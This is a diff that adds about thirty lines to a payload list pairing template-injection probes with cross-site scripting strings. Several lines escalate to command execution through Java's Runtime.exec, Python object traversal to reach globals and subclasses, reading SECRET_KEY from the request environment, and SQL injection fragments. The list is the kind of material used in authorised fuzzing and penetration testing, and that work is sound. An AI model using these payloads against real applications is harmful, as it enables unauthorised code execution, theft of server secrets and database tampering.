@@ -1,3 +1,32 @@
 {{7*7}}<script>alert(1)</script>
-${7*7}<img src=x onerror=alert(1)>
+${7*7}<script>alert(1)</script>
+#{7*7}<script>alert(1)</script>
 <%= 7*7 %><script>alert(1)</script>
+<% 7*7 %><script>alert(1)</script>
+{{7*7}}<img src=x onerror=alert(1)>
+${7*7}<img src=x onerror=alert(1)>
+#{7*7}<img src=x onerror=alert(1)>
+{{7*7}}<svg onload=alert(1)>
+${7*7}<svg onload=alert(1)>
+#{7*7}<svg onload=alert(1)>
+{{config}}<script>alert(1)</script>
+{{self}}<script>alert(1)</script>
+{{request}}<script>alert(1)</script>
+{{''.__class__.mro()}}<img src=x onerror=alert(1)>
+${T(java.lang.System).getProperties()}<script>alert(1)</script>
+${T(java.lang.Runtime).getRuntime().exec('id')}<script>alert(1)</script>
+#{T(java.lang.Runtime).getRuntime().exec('id')}<script>alert(1)</script>
+{{7*7}}"><img src=x onerror=alert(1)>
+${7*7}"><img src=x onerror=alert(1)>
+{{7*7}}' UNION SELECT '<script>alert(1)</script>',NULL--
+${7*7}' OR 1=1'<img src=x onerror=alert(1)>
+{{config.__class__.__init__.__globals__}}<img src=x onerror=alert(1)>
+{{request.environ}}<img src=x onerror=alert(1)>
+{{request.environ['SECRET_KEY']}}<img src=x onerror=alert(1)>
+{{7*'7'}}<script>alert(1)</script>
+${''.class.methods}<script>alert(1)</script>
+{{['x'].__class__.__mro__[-1].__subclasses__()}}<img src=x onerror=alert(1)>
+<script>/*{{7*7}}*/alert(1)</script>
+<!--{{7*7}}--><script>alert(1)</script>
+{{7*7}}<!-- --><script>alert(1)</script>
+{{self.__dict__}}<img src=x onerror=alert(1)>
